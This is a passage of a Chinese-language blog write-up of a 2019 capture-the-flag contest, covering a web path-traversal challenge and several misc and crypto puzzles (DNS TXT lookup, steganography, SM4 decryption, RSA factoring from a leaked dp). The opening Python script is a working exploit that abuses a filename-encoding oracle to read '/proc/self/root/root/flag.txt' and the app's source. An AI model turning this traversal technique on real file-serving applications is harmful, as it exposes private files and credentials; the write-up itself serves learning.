class="string">'text/plain'</span>)&#125;</span><br><span class="line">                      )</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)</span><br><span class="line">    pic_url = soup.find(<span class="string">'img'</span>)</span><br><span class="line">    <span class="comment"># print(pic_url['src'].replace('img.php?name=', ''))</span></span><br><span class="line">    filename = pic_url[<span class="string">'src'</span>].replace(<span class="string">'img.php?name='</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="comment"># print(filename)</span></span><br><span class="line">    urldecode = urllib.parse.unquote(filename)</span><br><span class="line">    <span class="keyword">return</span> urldecode[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(target, filename)</span>:</span></span><br><span class="line">    filename = urllib.parse.unquote(filename)</span><br><span class="line">    r = requests.get(target+<span class="string">"img.php"</span>,</span><br><span class="line">                     params=&#123;<span class="string">'name'</span>: filename&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    target = <span class="string">"http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/"</span></span><br><span class="line">    payload = <span class="string">"../.././proc/self/root/root/flag.txt"</span></span><br><span class="line">    <span class="comment"># payload = "../..//proc/self/cwd/app.py"</span></span><br><span class="line">    <span class="keyword">if</span> len(payload) % <span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"must be three times!"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    final = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(payload), <span class="number">3</span>):</span><br><span class="line">        final += base_encode(target, payload[i:i + <span class="number">3</span>])</span><br><span class="line">    final = urllib.parse.quote(final)</span><br><span class="line">    read(target, final)</span><br></pre></td></tr></table></figure></p>
+<p>所以可以得到flag如下<br><img src="https://i.loli.net/2019/08/16/IRlo2pfbsH8kGix.png" alt="F8BBDDFF7-AA616575E3.png"></p>
+<p>还可以读到对应的网站源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index.php')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload.php', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"不允许的格式"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/img.php', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    <span class="keyword">return</span> Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure></p>
+<p>这里有两个trick</p>
+<ol>
+<li>fuzz出文件名的编码关系，这个在挖洞中也会有场景，具体的去wooyun看</li>
+<li><code>/proc/self/cwd/</code> 指向的是当前路径，在本题中用于拼凑3倍数长度的字符串</li>
+</ol>
+<h2 id="0x04-签到题"><a href="#0x04-签到题" class="headerlink" title="0x04 签到题"></a>0x04 签到题</h2><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>I’m gamectf.com, I love TXT.</p>
+<h4 id="题目解答-3"><a href="#题目解答-3" class="headerlink" title="题目解答"></a>题目解答</h4><p>联想到TXT字段，所以直接查到flag</p>
+<p><img src="https://i.loli.net/2019/08/16/vnHfeML3Y7CAWby.png" alt="5A6A112C-D1A1-4244-B5B0-EE9AAF435A01.png"></p>
+<h2 id="0x05-24word"><a href="#0x05-24word" class="headerlink" title="0x05 24word"></a>0x05 24word</h2><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p>
+<h4 id="题目解答-4"><a href="#题目解答-4" class="headerlink" title="题目解答"></a>题目解答</h4><p>打开是一张这样的图片</p>
+<p><img src="https://i.loli.net/2019/08/16/MDjyHYscquJPXnR.png" alt="24w.png"></p>
+<p>binwalk -e 提取出其中的压缩包</p>
+<p>看图联想到社会主义核心价值观加密解密</p>
+<p><a href="https://z.duoluosb.com/" target="_blank" rel="noopener">https://z.duoluosb.com/</a></p>
+<p>自由 和谐 公正 诚信 平等 公正 自由 公正 平等 平等 公正<br>CodeV<br>公正 民主 公正 诚信 文明 法治 平等 公正 平等 法治 和谐<br>alues</p>
+<p>所以得到解压密码: CodeValues</p>
+<p>解压完又一张图，上面带了Data Matrix，微信扫一下得到flag</p>
+<p><img src="https://i.loli.net/2019/08/16/uBVDzZcHSr4JPsd.jpg" alt="24c 2.jpg"></p>
+<h2 id="0x06-七代目"><a href="#0x06-七代目" class="headerlink" title="0x06 七代目"></a>0x06 七代目</h2><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p>
+<h4 id="题目解答-5"><a href="#题目解答-5" class="headerlink" title="题目解答"></a>题目解答</h4><p>打开gif显示文件损坏，使用hex编辑器修改git头得到正常的文件</p>
+<p>然后在下面的网站将图逐帧分解</p>
+<p><a href="https://zh.bloggif.com/gif-extract?id=1e36fc0da9d495cfba235a6590b61ed7" target="_blank" rel="noopener">https://zh.bloggif.com/gif-extract?id=1e36fc0da9d495cfba235a6590b61ed7</a></p>
+<p>最终在第七帧使用stego分析得到flag</p>
+<p><img src="https://i.loli.net/2019/08/16/IBnLsO7uE4GcyNm.png" alt="7BE386FC-9FB2-4057-A121-E3360223E716.png"></p>
+<h2 id="0x07-亚萨西"><a href="#0x07-亚萨西" class="headerlink" title="0x07 亚萨西"></a>0x07 亚萨西</h2><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p>
+<h4 id="题目解答-6"><a href="#题目解答-6" class="headerlink" title="题目解答"></a>题目解答</h4><p>strings命令直接的得到pass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings yasaxi_45d7d3f89b50ad351e8bc385b591fd80.zip</span><br></pre></td></tr></table></figure></p>
+<p>解压文件夹后是一个图片<br>图片里面有ook编码<br>直接解码得到flag</p>
+<p><img src="https://i.loli.net/2019/08/16/sB5wKuyEYPvilHf.png" alt="57498389-1BD5-40DF-AA1E-D15BCAE51C0B.png"></p>
+<h2 id="0x08-sm4"><a href="#0x08-sm4" class="headerlink" title="0x08 sm4"></a>0x08 sm4</h2><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p>
+<h4 id="题目解答-7"><a href="#题目解答-7" class="headerlink" title="题目解答"></a>题目解答</h4><p><a href="https://github.com/yang3yen/pysm4" target="_blank" rel="noopener">https://github.com/yang3yen/pysm4</a></p>
+<p>国密SM4(无线局域网SMS4)算法， 一个分组算法， 分组长度为128bit， 密钥长度为128bit 所以需要分段解，注意补位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line">key = [<span class="number">13</span>, <span class="number">204</span>, <span class="number">99</span>, <span class="number">177</span>, <span class="number">254</span>, <span class="number">41</span>, <span class="number">198</span>, <span class="number">163</span>, <span class="number">201</span>, <span class="number">226</span>, <span class="number">56</span>, <span class="number">214</span>, <span class="number">192</span>, <span class="number">194</span>, <span class="number">98</span>, <span class="number">104</span>]</span><br><span class="line">c = [<span class="number">46</span>, <span class="number">48</span>, <span class="number">220</span>, <span class="number">156</span>, <span class="number">184</span>, <span class="number">218</span>, <span class="number">57</span>, <span class="number">13</span>, <span class="number">246</span>, <span class="number">91</span>, <span class="number">1</span>, <span class="number">63</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">105</span>, <span class="number">64</span>, <span class="number">149</span>, <span class="number">240</span>, <span class="number">217</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">49</span>, <span class="number">222</span>, <span class="number">61</span>, <span class="number">155</span>, <span class="number">225</span>, <span class="number">231</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">121</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">60</span>, <span class="number">182</span>, <span class="number">65</span>, <span class="number">101</span>, <span class="number">39</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">224</span>, <span class="number">9</span>, <span class="number">204</span>, <span class="number">154</span>, <span class="number">122</span>, <span class="number">206</span>, <span class="number">43</span>, <span class="number">97</span>, <span class="number">59</span>]</span><br><span class="line">tmp =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    <span class="keyword">if</span> len(str(hex(key[i])))&lt;<span class="number">4</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'0'</span>+str(hex(key[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp =tmp  + str(hex(key[i])[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">tmp =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">    <span class="keyword">if</span> len(str(hex(c[i])))&lt;<span class="number">4</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'0'</span>+str(hex(c[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp =tmp  + str(hex(c[i])[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">key =  <span class="number">0x0dcc63b1fe29c6a3c9e238d6c0c26268</span></span><br><span class="line">c1 =   <span class="number">0x2e30dc9cb8da390df65b013f3c436940</span></span><br><span class="line">c2 =   <span class="number">0x95f0d94d6b31de3d9be1e7c4a7790910</span></span><br><span class="line">c3 =   <span class="number">0x3cb6416527fdfae009cc9a7ace2b613b</span></span><br><span class="line"><span class="comment">#2e30dc9cb8da390df65b013f3c436940</span></span><br><span class="line"><span class="comment">#95f0d94d6b31de3d9be1e7c4a7790910</span></span><br><span class="line"><span class="comment">#3cb6416527fdfae009cc9a7ace2b613b</span></span><br><span class="line">clear_num1 = decrypt(c1, key)</span><br><span class="line">clear_num2 = decrypt(c2, key)</span><br><span class="line">clear_num3= decrypt(c3, key)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num1))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num2))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num3))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-db"><a href="#0x09-db" class="headerlink" title="0x09 db"></a>0x09 db</h2><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p>
+<h4 id="题目解答-8"><a href="#题目解答-8" class="headerlink" title="题目解答"></a>题目解答</h4><p>已知N dq 求分解问题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</span></span><br><span class="line">dp=<span class="number">81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</span></span><br><span class="line">c=<span class="number">5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</span></span><br><span class="line">r = <span class="number">3</span></span><br><span class="line">p = pow(r,e*dp,n)-r%n</span><br><span class="line">p = gmpy2.gcd(n,p)</span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span> n/p</span><br><span class="line">q= <span class="number">97967760714365562093916104858384893828746431642467029585975238084315810021090864458586154529967237614974563846071700091242756496083221705212495652837671370581444579945909265868365865106738889897018594915115133212043327703567935896287234339778667527842604275909693199845318489073853263155905386941710423649313</span></span><br><span class="line">fn = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d= gmpy2.invert(e,fn)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'d='</span>,d</span><br><span class="line">plain= pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, plain</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, hex(plain)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, hex(plain)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Game"><span class="toc-number">2.</span> <span class="toc-text">0x01 Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答"><span class="toc-number">2.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-who-are-you"><span class="toc-number">3.</span> <span class="toc-text">0x02 who_are_you?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-show-me-your-image"><span class="toc-number">4.</span> <span class="toc-text">0x03 show_me_your_image</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-2"><span class="toc-number">4.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-签到题"><span class="toc-number">5.</span> <span class="toc-text">0x04 签到题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-3"><span class="toc-number">5.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-3"><span class="toc-number">5.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-24word"><span class="toc-number">6.</span> <span class="toc-text">0x05 24word</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-4"><span class="toc-number">6.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-4"><span class="toc-number">6.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-七代目"><span class="toc-number">7.</span> <span class="toc-text">0x06 七代目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-5"><span class="toc-number">7.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-5"><span class="toc-number">7.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-亚萨西"><span class="toc-number">8.</span> <span class="toc-text">0x07 亚萨西</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-6"><span class="toc-number">8.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-6"><span class="toc-number">8.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-sm4"><span class="toc-number">9.</span> <span class="toc-text">0x08 sm4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-7"><span class="toc-number">9.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-7"><span class="toc-number">9.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-db"><span class="toc-number">10.</span> <span class="toc-text">0x09 db</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-8"><span class="toc-number">10.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-8"><span class="toc-number">10.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&text=网络与信息安全领域专项赛WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&is_video=false&description=网络与信息安全领域专项赛WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网络与信息安全领域专项赛WP&body=Check out this article: http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&title=网络与信息安全领域专项赛WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/&name=网络与信息安全领域专项赛WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-129276044-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'z3r0yu';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
